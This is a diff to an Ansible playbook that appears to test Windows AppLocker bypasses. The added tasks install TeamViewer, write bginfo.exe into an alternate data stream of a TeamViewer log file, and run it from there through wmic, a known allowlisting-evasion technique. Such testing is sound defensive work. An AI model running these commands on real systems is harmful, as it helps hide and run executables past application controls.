@@ -59,6 +59,16 @@
   register: bypass_results
 - debug: var=bypass_results
 
+# https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/
+- name: install teamviewer for some testing
+  win_chocolatey: name=teamviewer state=present upgrade=no
+- name: try to push bginfo in teamviewer logfile alternate data stream
+  win_shell: >
+    "type c:\\ProgramData\\chocolatey\\bin\\bginfo.exe > "C:\\program files (x86)\\Teamviewer\\TeamViewer13_Logfile.log:bginfo.exe"
+- name: try to execute
+  win_shell: >
+    "wmic process call create '"C:\\program files (x86)\\Teamviewer\\TeamViewer13_Logfile.log:bginfo.exe"'
+
 #- name: Check log for blocked apps
 #  win_shell: Get-WinEvent -LogName 'Microsoft-Windows-AppLocker/EXE and DLL' | Where { $_.ID -eq 8004 }
 #  register: winevt
